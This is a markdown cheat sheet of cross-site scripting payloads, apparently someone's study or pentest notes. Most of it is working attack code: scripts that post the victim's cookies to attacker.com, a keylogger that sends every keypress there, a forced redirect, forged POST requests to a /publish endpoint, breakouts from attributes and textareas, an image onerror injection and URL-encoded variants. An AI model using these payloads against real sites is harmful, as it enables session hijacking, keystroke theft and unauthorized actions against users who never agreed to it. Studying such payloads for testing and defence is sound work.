# XSS (Cross-Site Scripting) Notes

## **1. Basic XSS Payloads**

### **Simple Alert Payload**
```html
<script>alert('XSS');</script>
```
- **Purpose:** Displays an alert box to confirm XSS.

### **Advanced Examples**
1. **Stealing Cookies:**
   ```html
   <script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie});</script>
   ```
   - Sends cookies to a remote server.

2. **Redirecting the User:**
   ```html
   <script>window.location='http://attacker.com';</script>
   ```
   - Redirects the user to a malicious website.

3. **Keylogger:**
   ```html
   <script>
   document.addEventListener('keypress', e => {
       fetch('http://attacker.com/log', {method: 'POST', body: e.key});
   });
   </script>
   ```
   - Logs every keypress made by the user and sends it to the attacker.

4. **Dynamic DOM Injection:**
   ```html
   <script>document.body.innerHTML += '<input type="text" name="injected">';</script>
   ```
   - Dynamically injects an input box into the page.

---

## **2. Fetch-Based XSS Payloads**

### **Basic Fetch Payload**
```html
<script>
fetch('/publish');
</script>
```
- **Purpose:** Sends a `GET` request to `/publish`.

### **Sending POST Requests**
```html
<script>
fetch('/publish', {
    method: 'POST'
});
</script>
```
- **Purpose:** Sends a `POST` request to `/publish` without any data.

### **Advanced POST with Body**
```html
<script>
fetch('/publish', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'publish' })
});
</script>
```
- **Purpose:** Sends a `POST` request with JSON data to `/publish`.

### **Exfiltrating Cookies**
```html
<script>
fetch('http://attacker.com/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'cookies=' + encodeURIComponent(document.cookie)
});
</script>
```
- **Purpose:** Extracts cookies and sends them to a remote server.

---

## **3. Context-Specific Payloads**

### **Breaking Out of HTML Attributes**
```html
"><script>alert('XSS')</script>
```
- **Purpose:** Ends the current attribute and injects a `<script>` tag.

### **Breaking Out of Textareas**
```html
</textarea><script>fetch('/publish');</script>
```
- **Purpose:** Closes a `<textarea>` tag and executes JavaScript.

### **Image Tag Injection**
```html
<img src="x" onerror="fetch('/publish');">
```
- **Purpose:** Uses an image tag's `onerror` event to execute JavaScript.

---

## **4. URL Encoding for XSS**
### **Encoded Payloads**
#### **URL-Encoded XSS Payloads**
1. Basic Alert:
   ```html
   %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
   ```
2. Fetch with Encoded Characters:
   ```html
   %3Cscript%3Efetch%28%27%2Fpublish%27%29%3B%3C%2Fscript%3E
   ```

#### **Commonly Encoded Characters**
| Character | URL-Encoded | Hex Value |
|-----------|-------------|-----------|
| `<`       | `%3C`       | `3C`      |
| `>`       | `%3E`       | `3E`      |
| `"`       | `%22`       | `22`      |
| `'`       | `%27`       | `27`      |
| `}`       | `%7D`       | `7D`      |
| `|`       | `%7C`       | `7C`      |
| `=`       | `%3D`       | `3D`      |

---

## **5. Notes on Contexts**

- **Inside `<textarea>`:** Use `</textarea>` to escape the tag and inject JavaScript.
- **Inside HTML Attributes:** Use `">` or `'>'` to break out of the attribute.
- **Inside JavaScript:** Use `\` to escape quotes if needed.